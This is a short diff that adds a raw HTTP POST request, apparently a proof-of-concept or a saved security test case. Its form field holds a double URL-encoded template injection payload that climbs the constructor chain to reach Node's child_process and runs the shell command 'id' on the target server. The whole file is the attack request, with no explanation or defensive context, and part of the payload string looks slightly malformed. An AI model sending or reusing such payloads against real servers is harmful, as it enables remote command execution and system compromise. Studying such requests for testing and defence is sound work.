@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 163
+Connection: close
+
+s=%257B%257B%2Branges.constructor.constructor%2528%2522return%2Bimport%2522%2529%2528%2529%2528%2527child_process%2527%2529.exec%2528%2527id%2527%2529%2B%257D%257D
